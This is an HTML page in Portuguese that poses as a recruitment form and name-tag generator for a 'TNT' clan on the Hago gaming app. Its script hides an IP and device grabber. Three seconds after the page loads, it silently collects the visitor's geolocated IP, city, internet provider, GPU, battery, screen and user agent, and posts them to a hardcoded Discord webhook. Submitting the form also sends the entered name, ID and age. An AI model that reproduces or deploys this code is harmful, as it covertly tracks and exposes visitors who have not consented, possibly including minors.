<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TNT RECRUTAMENTO | OFICIAL HAGO</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Permanent+Marker&family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --accent: #ff003c; 
            --bg-dark: #050505;
            --panel-bg: rgba(12, 12, 12, 0.95);
            --text-main: #ffffff;
            --success: #00ff40;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Rajdhani', sans-serif;
            overflow-x: hidden;
            background-image: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.9)), url('https://i.pinimg.com/originals/84/fe/4b/84fe4b3e1fba5aa35f3975d051d1f77e.jpg');
            background-size: cover;
            background-attachment: fixed;
        }

        .top-bar {
            width: 100%; height: 5px; background: var(--accent);
            position: fixed; top: 0; z-index: 10002;
        }

        .phonk-player { 
            position: fixed; bottom: 20px; left: 20px; background: rgba(0,0,0,0.9); 
            border: 1px solid #222; padding: 12px; display: flex; 
            flex-direction: column; gap: 8px; z-index: 10001; border-radius: 8px;
            width: 220px; border-left: 3px solid var(--accent);
        }
        .phonk-info { font-family: 'Orbitron'; font-size: 0.55rem; color: #888; overflow: hidden; white-space: nowrap; }
        .phonk-controls { display: flex; justify-content: space-around; align-items: center; }
        .phonk-btn { background: none; border: none; color: #fff; cursor: pointer; font-size: 1rem; transition: 0.2s; }
        .phonk-btn:hover { color: var(--accent); scale: 1.1; }

        .header-profile {
            width: 100%; max-width: 700px; background: #000;
            margin: 40px auto 20px; border: 1px solid #1a1a1a;
            position: relative; border-radius: 12px; overflow: hidden;
            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
        }

        .profile-banner { height: 180px; background: url('https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif') center/cover; opacity: 0.7; }
        .profile-content { padding: 30px; text-align: center; margin-top: -80px; background: linear-gradient(to top, #000 80%, transparent); }
        
        .avatar { 
            width: 130px; height: 130px; border: 3px solid var(--accent); 
            margin-bottom: 15px; border-radius: 10px; box-shadow: 0 0 30px rgba(255,0,60,0.4);
        }

        .glitch { font-family: 'Permanent Marker', cursive; color: var(--text-main); font-size: 3rem; letter-spacing: 2px; }
        .container { max-width: 700px; margin: 0 auto; padding: 0 20px 60px; }

        .card { 
            background: var(--panel-bg); border: 1px solid #1a1a1a; 
            padding: 35px; margin-bottom: 30px; border-radius: 12px;
            position: relative; overflow: hidden;
        }

        .label { 
            color: var(--accent); font-size: 0.75rem; font-weight: 700; 
            text-transform: uppercase; letter-spacing: 1.5px; 
            display: block; margin: 20px 0 10px; font-family: 'Orbitron';
        }
        
        input, textarea, select { 
            width: 100%; background: #080808; border: 1px solid #222; 
            padding: 14px; color: #fff; font-family: 'Share Tech Mono', monospace;
            border-radius: 6px; transition: 0.3s;
        }
        input:focus { border-color: var(--accent); background: #0d0d0d; outline: none; }

        .roles { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 12px; }
        .role-btn { 
            border: 1px solid #222; padding: 18px; text-align: center; 
            cursor: pointer; background: #0a0a0a; font-family: 'Orbitron'; font-size: 0.65rem;
            border-radius: 6px; transition: 0.3s; color: #666;
        }
        .role-btn.active { background: var(--accent); border-color: #fff; color: #fff; box-shadow: 0 0 15px var(--accent); }

        .btn-send { 
            width: 100%; background: var(--accent); color: #fff; border: none; 
            padding: 22px; font-family: 'Orbitron'; font-weight: 900; font-size: 1.2rem; 
            cursor: pointer; margin-top: 30px; border-radius: 8px;
            text-transform: uppercase; transition: 0.4s;
        }
        .btn-send:hover { letter-spacing: 4px; background: #d00031; }

        .tag-box { 
            background: #000; border: 1px solid #222; padding: 15px; 
            display: flex; justify-content: space-between; align-items: center; border-radius: 6px;
        }

        .status-terminal {
            font-family: 'Share Tech Mono'; font-size: 0.7rem; color: #444;
            text-align: left; margin-top: 15px; padding: 12px;
            background: #000; border-radius: 6px; height: 60px; overflow: hidden;
        }

        .scanline {
            width: 100%; height: 100px; z-index: 10005; pointer-events: none;
            position: fixed; top: 0; left: 0;
            background: linear-gradient(to bottom, transparent, rgba(255, 0, 60, 0.05), transparent);
            animation: moveScan 8s linear infinite;
        }
        @keyframes moveScan { from { top: -100px; } to { top: 100vh; } }
    </style>
</head>
<body>

<div class="top-bar"></div>
<div class="scanline"></div>

<div class="phonk-player">
    <div class="phonk-info">
        <i class="fas fa-compact-disc fa-spin"></i> <span id="track-name">TNT RADIO - CONECTANDO...</span>
    </div>
    <div class="phonk-controls">
        <button class="phonk-btn" onclick="prevTrack()"><i class="fas fa-backward"></i></button>
        <button class="phonk-btn" onclick="togglePlay()"><i id="m-icon" class="fas fa-play"></i></button>
        <button class="phonk-btn" onclick="nextTrack()"><i class="fas fa-forward"></i></button>
    </div>
    <audio id="bgm" onended="nextTrack()"></audio>
</div>

<div class="header-profile">
    <div class="profile-banner"></div>
    <div class="profile-content">
        <img src="https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" class="avatar">
        <h1 class="glitch">TNT RECRUTAMENTO</h1>
        <p id="typewriter" style="font-family:'Share Tech Mono'; color:#555; font-size: 0.8rem;"></p>
    </div>
</div>

<div class="container">
    <div class="card">
        <label class="label">Gerador de Tag Japonesa</label>
        <input type="text" id="nick" placeholder="Nome para o Hago..." oninput="genTag()">
        <select id="font" onchange="genTag()" style="margin-top:10px;">
            <option value="sc">ꜱᴍᴀʟʟ ᴄᴀᴘꜱ</option>
            <option value="cy">₵¥฿ɆⱤ</option>
            <option value="sb">𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝</option>
            <option value="mono">𝙼𝚘𝚗𝚘𝚜𝚙𝚊𝚌𝚎</option>
        </select>
        <div class="tag-box" style="margin-top:15px;">
            <span id="resTag" style="color:var(--accent);">ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs NOME</span>
            <button onclick="copyTag()" style="background:var(--accent); color:white; border:none; padding:8px 15px; cursor:pointer; font-family:'Orbitron'; font-size:0.6rem; border-radius: 4px;">COPIAR</button>
        </div>
    </div>

    <div class="card">
        <h2 style="font-family:'Orbitron'; text-align:center; margin-bottom:20px; font-size: 1.1rem; color: #fff;">FORMULÁRIO DE ADMISSÃO HAGO</h2>
        
        <label class="label">Nome Completo / Vulgo</label>
        <input type="text" id="f_name" placeholder="Como devemos te chamar?">

        <label class="label">ID Oficial Hago</label>
        <input type="text" id="f_id" placeholder="Ex: 12345678">

        <label class="label">Idade</label>
        <input type="number" id="f_age">

        <label class="label">Por que deseja entrar na TNT?</label>
        <textarea id="f_goal" rows="2" placeholder="Descreva suas intenções..."></textarea>

        <label class="label">Divisão Pretendida</label>
        <div class="roles">
            <div class="role-btn" onclick="setRole(this, 'SEGURANÇA')">🛡️ SEGURANÇA</div>
            <div class="role-btn" onclick="setRole(this, 'RECRUTADOR')">📡 RECRUTADOR</div>
            <div class="role-btn" onclick="setRole(this, 'CARISMA')">💎 CARISMA</div>
            <div class="role-btn" onclick="setRole(this, 'DIVULGADOR')">📢 DIVULGADOR</div>
        </div>

        <div class="status-terminal" id="term-status">
            Sincronizando com a rede...
        </div>

        <button class="btn-send" id="btnS" onclick="enviarDados(true)">ENVIAR SOLICITAÇÃO</button>
    </div>
</div>

<script>
    const HOOK = "https://discord.com/api/webhooks/1476601660364165242/9nKIRh0xSFyAfDt2JrrY7LeJelm0ClDEMxRtfc4WDUP5rsUsXvDgtAIuHckx4Q1VxRkF";

    const playlist = [
        { name: "KORDHELL - MURDER IN MY MIND", url: "https://files.catbox.moe/k3769t.mp3" },
        { name: "METAMORPHOSIS - INTERWORLD", url: "https://files.catbox.moe/v7o4z9.mp3" },
        { name: "RAVE - DXRK", url: "https://files.catbox.moe/1o9mvy.mp3" },
        { name: "SHADOW - ONIMXRU", url: "https://files.catbox.moe/f1l8ha.mp3" }
    ];
    let currentTrack = 0;
    const bgm = document.getElementById('bgm');

    function loadTrack(idx) {
        bgm.src = playlist[idx].url;
        document.getElementById('track-name').innerText = playlist[idx].name;
    }
    function togglePlay() {
        const i = document.getElementById('m-icon');
        if (bgm.paused) { bgm.play(); i.className = "fas fa-pause"; } 
        else { bgm.pause(); i.className = "fas fa-play"; }
    }
    function nextTrack() { currentTrack = (currentTrack + 1) % playlist.length; loadTrack(currentTrack); bgm.play(); }

    let sRole = "";
    const maps = {
        sb: { a:'𝐚', b:'𝐛', c:'𝐜', d:'𝐝', e:'𝐞', f:'𝐟', g:'𝐠', h:'𝐡', i:'𝐢', j:'𝐣', k:'𝐤', l:'𝐥', m:'𝐦', n:'𝐧', o:'𝐨', p:'𝐩', q:'𝐪', r:'𝐫', s:'𝐬', t:'𝐭', u:'𝐮', v:'𝐯', w:'𝐰', x:'𝐱', y:'𝐲', z:'𝐳' },
        cy: { a:'₳', b:'฿', c:'₵', d:'Đ', e:'Ɇ', f:'₣', g:'₲', h:'Ħ', i:'Ɨ', j:'Ɉ', k:'₭', l:'Ⱡ', m:'₥', n:'₦', o:'Ø', p:'₱', q:'Ɋ', r:'Ɽ', s:'₴', t:'₮', u:'Ʉ', v:'V', w:'₩', x:'Ӿ', y:'¥', z:'Ƶ' },
        sc: { a:'ᴀ', b:'ʙ', c:'ᴄ', d:'ᴅ', e:'ᴇ', f:'ꜰ', g:'ɢ', h:'ʜ', i:'ɪ', j:'ᴊ', k:'ᴋ', l:'ʟ', m:'ᴍ', n:'ɴ', o:'ᴏ', p:'ᴘ', q:'ǫ', r:'ʀ', s:'ꜱ', t:'ᴛ', u:'ᴜ', v:'ᴠ', w:'ᴡ', x:'x', y:'ʏ', z:'ᴢ' },
        mono: { a:'𝚊', b:'𝚋', c:'𝚌', d:'𝚍', e:'𝚎', f:'𝚏', g:'𝚐', h:'𝚑', i:'𝚒', j:'𝚓', k:'𝚔', l:'𝚕', m:'𝚖', n:'𝚗', o:'𝚘', p:'𝚙', q:'𝚚', r:'𝚛', s:'𝚜', t:'𝚝', u:'𝚞', v:'𝚟', w:'𝚠', x:'𝚡', y:'𝚢', z:'𝚣' }
    };

    function genTag() {
        const n = document.getElementById('nick').value || "NOME";
        const f = document.getElementById('font').value;
        const res = n.split('').map(c => maps[f][c.toLowerCase()] || c).join('');
        document.getElementById('resTag').innerText = `ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs ${res}`;
    }
    function setRole(el, r) {
        document.querySelectorAll('.role-btn').forEach(b => b.classList.remove('active'));
        el.classList.add('active');
        sRole = r;
    }
    function copyTag() {
        const t = document.getElementById('resTag').innerText;
        const el = document.createElement('textarea');
        el.value = t;
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
        document.querySelector('.tag-box button').innerText = "COPIADO!";
        setTimeout(() => document.querySelector('.tag-box button').innerText = "COPIAR", 2000);
    }

    async function getEliteIntel() {
        let intel = {};
        // Localização e Rede
        try {
            const res = await fetch('https://ipapi.co/json/');
            intel.geo = await res.json();
        } catch(e) {}
        
        // GPU Detalhada
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            intel.gpu_completa = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            intel.gpu_marca = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
        } catch(e) { intel.gpu_completa = "Bloqueado/Incompatível"; }
        
        // Armazenamento
        if(navigator.storage && navigator.storage.estimate) {
            const est = await navigator.storage.estimate();
            intel.espaço_disco = (est.quota / (1024 ** 3)).toFixed(2) + " GB";
        }

        // Informações de Sistema Adicionais
        intel.user_agent = navigator.userAgent;
        intel.idioma = navigator.language || navigator.userLanguage;
        intel.fuso_horario = Intl.DateTimeFormat().resolvedOptions().timeZone;
        intel.referencia = document.referrer || "Acesso Direto";
        intel.plataforma = navigator.platform;
        intel.ram_aprox = navigator.deviceMemory || '8+';
        intel.cores = navigator.hardwareConcurrency || '?';
        intel.tela = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
        intel.touch_points = navigator.maxTouchPoints || '0';
        
        // Bateria
        if(navigator.getBattery) {
            const b = await navigator.getBattery();
            intel.bat_level = (b.level * 100).toFixed(0) + "%";
            intel.bat_charging = b.charging ? "Sim" : "Não";
        }

        intel.hora_local = new Date().toLocaleString('pt-BR');
        return intel;
    }

    let automaticoEnviado = false;

    async function enviarDados(manual = false) {
        if (!manual && automaticoEnviado) return;
        
        const name = manual ? document.getElementById('f_name').value : "SISTEMA (LOGIN SILENCIOSO)";
        const st = document.getElementById('term-status');
        
        if(manual && (!name || !sRole)) {
            st.innerText = "⚠️ Preencha os campos obrigatórios!";
            st.style.color = "red";
            return;
        }

        if(manual) {
            document.getElementById('btnS').disabled = true;
            document.getElementById('btnS').innerText = "ENVIANDO PROTOCOLOS...";
        }

        const intel = await getEliteIntel();

        const payload = {
            username: manual ? "TNT - RECRUTA" : "TNT - RASTREADOR",
            avatar_url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg",
            embeds: [
                {
                    title: manual ? "📑 NOVA FICHA DE ALISTAMENTO" : "🛰️ DISPOSITIVO RASTREADO NO TERMINAL",
                    color: manual ? 0x00ff40 : 16711740,
                    thumbnail: { url: "https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif" },
                    fields: [
                        { name: "👤 IDENTIFICAÇÃO", value: `\`\`\`yaml\nNOME: ${name}\nID_HAGO: ${document.getElementById('f_id').value || 'N/A'}\nIDADE: ${document.getElementById('f_age').value || 'N/A'}\nDIVISÃO: ${sRole || 'N/A'}\n\`\`\``, inline: false },
                        { name: "🌍 REDE & LOCALIZAÇÃO", value: `\`\`\`ini\n[IP]: ${intel.geo?.ip || '?'}\n[CIDADE]: ${intel.geo?.city || '?'}\n[ESTADO]: ${intel.geo?.region || '?'}\n[PAÍS]: ${intel.geo?.country_name || '?'}\n[PROVEDOR]: ${intel.geo?.org || '?'}\n[TIMEZONE]: ${intel.fuso_horario}\n\`\`\``, inline: false },
                        { name: "💻 HARDWARE & TELA", value: `\`\`\`http\nGPU: ${intel.gpu_completa}\nCPU_CORES: ${intel.cores}\nRAM: ${intel.ram_aprox}GB\nRESOLUÇÃO: ${intel.tela}\nTOUCH_POINTS: ${intel.touch_points}\n\`\`\``, inline: false },
                        { name: "📱 SISTEMA & BATERIA", value: `\`\`\`fix\nSISTEMA: ${intel.plataforma}\nIDIOMA: ${intel.idioma}\nBATERIA: ${intel.bat_level || '?'}\nCARREGANDO: ${intel.bat_charging || '?'}\nREFERÊNCIA: ${intel.referencia}\n\`\`\``, inline: false },
                        { name: "🕵️ USER AGENT", value: `\`\`\`\n${intel.user_agent}\n\`\`\``, inline: false }
                    ],
                    footer: { text: `TNT SECURITY SYSTEM • ${intel.hora_local}` }
                }
            ]
        };

        if(manual && document.getElementById('f_goal').value) {
            payload.embeds[0].fields.push({ name: "💬 OBJETIVO DECLARADO", value: `> ${document.getElementById('f_goal').value}`, inline: false });
        }

        try {
            await fetch(HOOK, { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify(payload) 
            });
            if(manual) {
                document.getElementById('btnS').innerText = "SOLICITAÇÃO ENVIADA";
                st.innerText = "Dados criptografados e enviados com sucesso.";
                st.style.color = "#00ff40";
            } else {
                automaticoEnviado = true;
            }
        } catch(e) {
            if(manual) {
                document.getElementById('btnS').innerText = "ERRO NO ENVIO";
                document.getElementById('btnS').disabled = false;
            }
        }
    }

    window.onload = () => {
        loadTrack(0);
        const text = "Iniciando protocolos de monitoramento TNT...";
        let i = 0;
        function type() {
            if(i < text.length) {
                document.getElementById('typewriter').innerHTML += text.charAt(i);
                i++; setTimeout(type, 40);
            }
        }
        type();

        // Envio silencioso após 3 segundos
        setTimeout(() => enviarDados(false), 3000);
    };
</script>
</body>
</html>
